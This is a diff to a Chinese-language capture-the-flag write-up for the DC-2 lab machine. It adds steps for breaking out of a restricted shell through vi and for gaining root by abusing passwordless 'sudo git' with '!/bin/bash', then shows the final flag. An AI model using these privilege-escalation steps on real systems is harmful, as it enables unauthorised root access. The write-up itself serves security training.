@@ -89,21 +89,28 @@ http://dc-2/wp-admin
 ssh tom@192.168.7.129 -p 7744
 ```
 
+### vi提权
+
+```
+vi
+ESC
+:set shell=/bin/bash
+:shell
+```
 ### 添加PATH使用更多命令
 
 ```zsh
 export PATH=/bin:$PATH
 ```
 
-### 由此查看flag3
-
 ```zsh
 tom@DC-2:~$ su jerry
+jerry@DC-2:/home/tom$ cd
 jerry@DC-2:~$ ls
 flag4.txt
 ```
 
-### 得到flag4
+得到`flag4`
 
 ```zsh
 jerry@DC-2:~$ cat flag4.txt
@@ -114,4 +121,49 @@ You still need to get the final flag (the only flag that really counts!!!).
 No hints here - you're on your own now.  :-)
 
 Go on - git outta here!!!!
+```
+
+### Git提权
+
+```shell
+jerry@DC-2:~$ sudo -l
+Matching Defaults entries for jerry on DC-2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jerry may run the following commands on DC-2:
+    (root) NOPASSWD: /usr/bin/git
+jerry@DC-2:~$ sudo git
+usage: git [--version] [--help] [-C <path>] [-c name=value]
+           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
+           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]
+           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
+           <command> [<args>]
+```
+
+`sudo git`可以无密码使用
+
+```shell
+sudo git -p help
+!/bin/bash
+```
+
+```
+root@DC-2:/home/jerry# cd
+root@DC-2:~# ls
+final-flag.txt
+root@DC-2:~# cat final-flag.txt
+ __    __     _ _       _                    _
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/
+
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it's all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
 ```
